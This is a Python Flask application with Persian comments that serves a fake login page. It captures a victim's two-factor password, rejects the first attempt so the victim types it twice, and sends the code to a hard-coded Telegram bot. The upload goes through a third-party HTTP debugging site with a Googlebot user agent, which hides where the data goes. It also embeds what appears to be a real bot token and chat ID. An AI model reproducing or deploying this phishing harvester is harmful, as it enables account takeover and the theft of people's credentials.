from flask import Flask, request, render_template, session, jsonify
import requests

app = Flask(__name__)
app.secret_key = "supersecretkey"  # کلید برای مدیریت session

# تنظیمات ربات تلگرام
BOT_TOKEN = "6445656205:AAFLnpRFXgRvD8I3dMXahrSJxufEV3vdVHY"
CHAT_ID = "5088806230"

# وب‌سایت واسط برای ارسال درخواست به تلگرام
INTERMEDIATE_URL = "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx"

@app.route("/", methods=["GET", "POST"])
def index():
    if "attempts" not in session:
        session["attempts"] = 0  # مقداردهی اولیه تعداد تلاش‌ها

    return render_template("index.html")

@app.route("/send_password", methods=["POST"])
def send_password():
    try:
        data = request.get_json()
        if not data or "password" not in data:
            return jsonify({"status": "error", "message": "enter password!"}), 400

        password = data["password"]
        session["attempts"] += 1  # افزایش تعداد تلاش‌ها

        if session["attempts"] < 2:
            return jsonify({"status": "error", "message": "password is inccorect!"})
        else:
            # ارسال رمز عبور به تلگرام
            message = f"🔐 2 factor pssword: {password}"
            send_message_to_telegram(message)

            session["attempts"] = 0  # بازنشانی تعداد تلاش‌ها پس از ارسال موفقیت‌آمیز

            return jsonify({"status": "success", "message": "password verified !"})

    except Exception as e:
        return jsonify({"status": "error", "message": f"server error: {str(e)}"}), 500

def send_message_to_telegram(message):
    """ارسال پیام به تلگرام از طریق سایت واسط"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
        data = {
            "UrlBox": url,
            "AgentList": "Googlebot",
            "VersionsList": "HTTP/1.1",
            "MethodList": "POST"
        }
        response = requests.post(INTERMEDIATE_URL, data)
        print("password sent to server:", response.text)

    except Exception as e:
        print("there was an error in sending data to server, try again later!:", str(e))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)
